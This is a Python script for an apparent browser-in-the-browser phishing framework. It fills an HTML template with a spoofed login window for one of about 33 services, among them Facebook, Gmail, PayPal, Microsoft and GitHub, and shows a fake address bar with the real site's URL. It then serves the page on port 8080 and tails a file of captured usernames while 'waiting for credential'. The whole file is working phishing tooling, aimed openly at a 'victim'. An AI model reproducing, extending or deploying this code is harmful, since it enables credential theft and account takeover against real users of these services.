import os
import re
import time
from termcolor import colored as cl
banner="""                                                                        
    ,           ,
   /             \\
  ((__-^^-,-^^-__))
   `-_---' `---_-'
    <__|o` 'o|__>
       \  `  /
        ): :(
        :o_o:  **BITB-Framework**
         "-"   @Surya Dev Singh
"""
print(cl(banner,"green"))
print(" ")
def open_server(path,title,webname):
    main_path = "sites/"+path+"/index.php"
    domain=path.capitalize()
    favicon=f'https://www.google.com/s2/favicons?domain=https://{path}.com'
    with open(r'main.html','r') as file :
        data = file.read()
        data = data.replace("XX-TITLE-XX",title).replace("XX-DOMAIN-NAME-XX",webname).replace("XX-PHISHING-LINK-XX",main_path).replace("XX-LOGO-XX",f"{favicon}").replace("Click me",f"<img src={favicon} style='position:relative;top:2px'></img>&nbsp;&nbsp;<b style='position:relative;bottom:2px'>Login With {domain}</b>")
    with open(r'index.html','w') as file :
        file.write(data)
    print("""Phishing Method :
    
    01 -> localhost
    """)
    method_s = input(cl("Enter Value ▶ ","yellow"))
    print()
    if method_s == '01' or method_s == '1' :
        os.system("php -S 0.0.0.0:8080 -q &")
        time.sleep(3)
        print()
        print(cl("[+]","green"), "waiting for credential ....")
        print() 
        os.system("tail -f sites/userpass/usernames.txt")
    
def pages(m_input):
   
    if   m_input == '01' or m_input == '1':
        print("""Facebook : 
        01 -> Traditional Login Page
        02 -> Advanced Voting Poll Login Page
        03 -> Fake Security Login Page
        04 -> Facebook Messenger Login Page
        """)
        fb_input = input(cl("Select Facebook Page ▶ ","yellow"))
        if fb_input == '01' or fb_input == '1':
            open_server("facebook","Facebook","https://www.facebook.com/login")
        elif fb_input == '02' or fb_input == '2':
            open_server("fb_advanced","Facebook","https://www.facebook.com/advanced/login")
        elif fb_input == '03' or fb_input == '3':
            open_server("fb_security","Facebook","https://www.facebook.com/security/login")
        elif fb_input == '04' or fb_input == '4':
            open_server("fb_messenger","Facebook","https://www.facebook.com/login")
        else : 
            print("Enter the valid value")
            pages('1')

    elif m_input == '02' or m_input == '2':
        print("""Instagram :    
        01 -> Traditional Login Page   
        02 -> Auto Followers Login Page
        03 -> 1000 Followers Login Page
        04 -> Blue Badge Verify Login Page
        """)
        insta_input = input(cl("Select Instagram Page ▶ ","yellow"))
        if insta_input == '01' or insta_input == '1':
            open_server("instagram","Instagram","https://www.instagram.com/accounts/login")
        elif insta_input == '02' or insta_input == '2':
            open_server("ig_followers","Instagra","https://igfollower.net/girisyap")
        elif insta_input == '03' or insta_input == '3':
            open_server("insta_followers","Instagram","https://instagramfollowers.com/login")
        elif insta_input == '04' or insta_input == '4':
            open_server("ig_verify","Instagram","https://www.instagram.com/accounts/verify")
        else : 
            print("Enter the valid value")
            pages(m_input)
    elif m_input == '03' or m_input == '3':
        print("""Google/Gmail : 
        01 -> Gmail Old Login Page
		02 -> Gmail New Login Page
		03 -> Advanced Voting Poll
        """)
        gml_input = input("Select Google/Gmail Page : ")
        if gml_input == '01' or gml_input == '1':
            open_server("google","Google","https://www.google.com/login")
        elif gml_input == '02' or gml_input == '2':
            open_server("google_new","Google","https://www.google.com/auth/login")
        elif gml_input == '03' or gml_input == '3':
            open_server("google_poll","Google","https://www.google.com/votting/login")
        else : 
            print("Enter the valid value")
            pages('3')
    elif m_input == '04' or m_input == '4':
        open_server("microsoft","Microsoft","https://account.microsoft.com/login")
    elif m_input == '05' or m_input == '5':
        open_server("netflix","Netflix","https://www.netflix.com/in/Login")
    elif m_input == '06' or m_input == '6':
        open_server("paypal","Paypal","https://www.paypal.com/in/signin")
    elif m_input == '07' or m_input == '7':
        open_server("steam","Steam","https://store.steampowered.com/login/")
    elif m_input == '08' or m_input == '8':
        open_server("twitter","Twitter","https://twitter.com/i/flow/login")
    elif m_input == '09' or m_input == '9':
        open_server("playstation","Playstation","https://www.playstation.com/en-in/")
    elif m_input == '10':
        open_server("tiktok","Tiktok","https://www.tiktok.com/login")
    elif m_input == '11':
        open_server("twitch","Twitch","https://www.twitch.tv/login")
    elif m_input == '12':
        open_server("pinterest","Pinterest","https://in.pinterest.com/login/")
    elif m_input == '13':
        open_server("snapchat","Snapchat","https://accounts.snapchat.com/accounts/login")
    elif m_input == '14':
        open_server("linkedin","Linkedin","https://www.linkedin.com/login")
    elif m_input == '15':
        open_server("ebay","Ebay","https://signin.ebay.com/ws/eBayISAPI.dll")
    elif m_input == '16':
        open_server("quora","Quora","https://www.quora.com/")
    elif m_input == '17':
        open_server("protonmail","Protonmail","https://mail.protonmail.com/login")
    elif m_input == '18':
        open_server("spotify","Spotify","https://accounts.spotify.com/en/login")
    elif m_input == '19':
        open_server("reddit","Reddit","https://www.reddit.com/login/")
    elif m_input == '20':
        open_server("adobe","Adobe","https://auth.services.adobe.com/en_US/index.html#/")
    elif m_input == '21':
        open_server("deviantart","Deviantart","https://www.deviantart.com/users/login")    
    elif m_input == '22':
        open_server("badoo","Badoo","https://badoo.com/signin")
    elif m_input == '23':
        open_server("origin","Origin","https://www.origin.com/login")
    elif m_input == '24':
        open_server("dropbox","Dropbox","https://www.dropbox.com/login")
    elif m_input == '25':
        open_server("yahoo","Yahoo","https://login.yahoo.com/")
    elif m_input == '26':
        open_server("wordpress","Wordpress","https://wordpress.com/log-in")
    elif m_input == '27':
        open_server("yandex","Yandex","https://passport.yandex.com/auth")
    elif m_input == '28':
        open_server("stackoverflow","Stackoverflow","https://stackoverflow.com/users/login")
    elif m_input == '29':
        print("""
        01 -> Traditional Login Page
		02 -> Advanced Voting Poll Login Page
        """)
        vk_input = input("Select Instagram Page : ")
        if vk_input == '01' or vk_input == '1':
            open_server("vk","Vk","https://id.vk.com/auth?app_id=7913379&v=1.44.0&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&uuid=a9imGGNLIk4OQr1iMP_aB&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl9pbiJ9fQ%3D%3D")
        elif vk_input == '02' or vk_input == '2':
            open_server("vk_poll","Vk","https://id.vk.com/auth?app_id=7913379&v=1.44.0&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&uuid=a9imGGNLIk4OQr1iMP_aB&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl9pbiJ9fQ%3D%3D")
        
        else : 
            print("Enter the valid value")
            pages('29')
    elif m_input == '30':
        open_server("xbox","Xbox","https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.3.6963.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-in%2faccountcreation%3freturnUrl%3dhttps%253a%252f%252fwww.xbox.com%252fen-IN%252flive%26ru%3dhttps%253a%252f%252fwww.xbox.com%252fen-IN%252flive%26rtc%3d1%26csrf%3dr9QPnukGPmJtqT7_bifZSYFY-Z2js7GJfx09N6bNEXBy14UnlQ5Nn7jS62vnrWl1rJcEutefSeN0nFSZ6IxYWeuTY8s1&lc=16393&id=292543&nopa=2&aadredir=1")
    elif m_input == '31':
        open_server("mediafire","Mediafire","https://www.mediafire.com/login")
    elif m_input == '32':
        open_server("gitlab","Gitlab","https://gitlab.com/users/sign_in")
    elif m_input == '33':
        open_server("github","Github","https://github.com/login")
    elif m_input == '99':
        print("Github : https://surya-dev.medium.com/")
    elif m_input == '00' or m_input == '0':
        print("Thnak you for using this tool....")
        exit()
    else :
        print("\n--> Enter valid value...\n")
print(" ")
print(cl("Select An Attack For Your Victim: ","cyan")) 
print(""" 
    01 -> Facebook      11 -> Twitch       21 -> DeviantArt
    02 -> Instagram     12 -> Pinterest    22 -> Badoo
    03 -> Google/Gmail  13 -> Snapchat     23 -> Origin
    04 -> Microsoft     14 -> Linkedin     24 -> DropBox        
    05 -> Netflix       15 -> Ebay         25 -> Yahoo          
    06 -> Paypal        16 -> Quora        26 -> Wordpress
    07 -> Steam         17 -> Protonmail   27 -> Yandex                 
    08 -> Twitter       18 -> Spotify      28 -> StackoverFlow
    09 -> Playstation   19 -> Reddit       29 -> Vk
    10 -> Tiktok        20 -> Adobe        30 -> XBOX
    31 -> Mediafire     32 -> Gitlab       33 -> Github

    99 -> About         00 -> Exit
""")

while True:
    m_input = input(cl("Enter Value ▶ ","yellow"))
    if (m_input == '1' or m_input == '2' or m_input == '3' or m_input == '4' or m_input == '5' or
        m_input == '6' or m_input == '7' or m_input == '8' or m_input == '9' or m_input == '10' or 
        m_input == '11' or m_input == '12' or m_input == '13' or m_input == '14' or m_input == '15' or
        m_input == '16' or m_input == '17' or m_input == '18' or m_input == '19' or m_input == '20' or
        m_input == '21' or m_input == '22' or m_input == '23' or m_input == '24' or m_input == '25' or
        m_input == '26' or m_input == '27' or m_input == '28' or m_input == '29' or m_input == '30' or
        m_input == '31' or m_input == '32' or m_input == '33' or m_input == '99' or m_input == '00' or
        m_input == '01' or m_input == '02' or m_input == '03' or m_input == '04' or m_input == '05' or
        m_input == '06' or m_input == '07' or m_input == '08' or m_input == '09' or m_input == '0') : 
        pages(m_input) 
        break
    else:
        print("\n Enter valid value...\n")
